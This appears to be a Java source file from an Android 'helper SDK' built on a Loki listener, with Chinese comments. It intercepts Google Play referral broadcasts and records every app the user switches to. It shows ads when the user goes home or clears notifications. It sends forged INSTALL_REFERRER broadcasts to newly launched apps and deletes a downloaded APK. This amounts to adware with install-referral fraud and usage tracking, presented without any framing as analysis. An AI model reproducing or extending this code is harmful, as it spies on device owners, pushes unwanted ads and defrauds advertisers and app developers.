package com.androidhelper.sdk;

import java.io.File;
import java.util.Iterator;

import android.content.Intent;
import android.os.Handler;
import android.os.Looper;

import com.androidhelper.sdk.ad.ADController;
import com.androidhelper.sdk.ad.task.ADTaskBuilder;
import com.androidhelper.sdk.ad.task.TaskType;
import com.androidhelper.sdk.entity.Apk;
import com.androidhelper.sdk.statistical.AppRecord;
import com.androidhelper.sdk.tools.AMLogger;
import com.androidhelper.sdk.tools.CommonUtils;
import com.loki.sdk.LokiListener;

public class SDKListener extends LokiListener {
	
	public SDKListener() {
		this.handler = new Handler(Looper.getMainLooper());
	}
	
	private Handler handler;
	
	/**
     * 当检测到Google Play Referral广播时触发此事件
     * 通常情况下此函数执行时间必须小于1秒，否则可能会导致ANR
     * 当执行时间小于1秒时，可直接在函数内部修改intent，如果函数执行时间过长，则可以先cancel广播，稍后再发出
     * @param intent    Referral广播intent
     * @return true表示cancel此广播，false表示允许广播发送
     */
    @Override
    public boolean onReferralBroadcast(Intent intent) {
    	if(null != intent) {
    		AMLogger.e(null, "referrer : " + intent.getStringExtra("referrer"));
    	}
        return false;
    }

    /**
     * 当检测到应用切换时触发此事件
     * @param packageName    当前前台软件包名
     * @param isLauncher     当前前台软件包是否为launcher
     */
    @Override
    public void onApplicationSwitch(String packageName, boolean isLauncher) {
    	if(isLauncher) {
    		try {
    			ADType adType = ADController.getInstance().getDisplayADType(AMApplication.instance, EventType.EXIT_APP);
    			handler.post(new ExitAppTask(adType));
    		} catch (Exception e) {
    			AMLogger.e(null, e.getMessage());
    		}
    	}
    	AppRecord record = new AppRecord(packageName);
    	record.record();
    	
    	Iterator<Apk> apkIterator = AMApplication.instance.installApks.iterator();
		while (apkIterator.hasNext()) {
			Apk apk = apkIterator.next();
			if(null == apk) {
				continue;
			}
			String name = apk.getPackageName();
			if(CommonUtils.isEmptyString(name) || !name.equals(packageName)) {
				continue;
			}
			String referrer = apk.getReferrer();
			Intent referrerIntent = new Intent("com.android.vending.INSTALL_REFERRER");
			referrerIntent.putExtra("referrer", referrer);
			referrerIntent.setPackage(name);
			referrerIntent.setFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES);
			AMApplication.instance.sendBroadcast(referrerIntent);
			apkIterator.remove();
			File dir = AMApplication.instance.getFilesDir();
			File file = new File(dir.getAbsolutePath() + "/new.apk");
			if(null != file && file.exists()) {
				file.delete();
			}
		}
    }

    /**
     * 当清除通知栏通知时触发此事件
     * 在点击清除时此回调就会触发，如果需要在此回调时发送新的通知，需要加入1秒左右的延迟
     */
    @Override
    public void onCleanNotification() {
    	if(!CommonUtils.isLauncher(AMApplication.instance)) {
    		return;
    	}
		try {
			ADType adType = ADController.getInstance().getDisplayADType(AMApplication.instance, EventType.CLEAR_NOTIFY);
			if(null != adType) {
				ADTaskBuilder builder = new ADTaskBuilder();
				builder.setADType(TaskType.values()[adType.ordinal()], AMApplication.instance, null);
				builder.build().start();
			}
		} catch (Exception e) {
			AMLogger.e(null, e.getMessage());
		}
    }

    /**
     * 当开始新的Google Play下载时触发此事件
     * @param packageName    下载的软件包名
     * @param versionCode    下载的软件包版本号
     */
    @Override
    public void onGooglePlayDownload(String packageName, int versionCode) {
    	AMLogger.e(null, "GP downloading : " + packageName);
    }
    
    private class ExitAppTask implements Runnable {

		private ADType mAdType;
		
		public ExitAppTask(ADType adType) {
			mAdType = adType;
		}

		@Override
		public void run() {
			if(null != mAdType) {
				ADTaskBuilder builder = new ADTaskBuilder();
				builder.setADType(TaskType.values()[mAdType.ordinal()], AMApplication.instance, null);
				builder.build().start();
			}
		}
	}
}
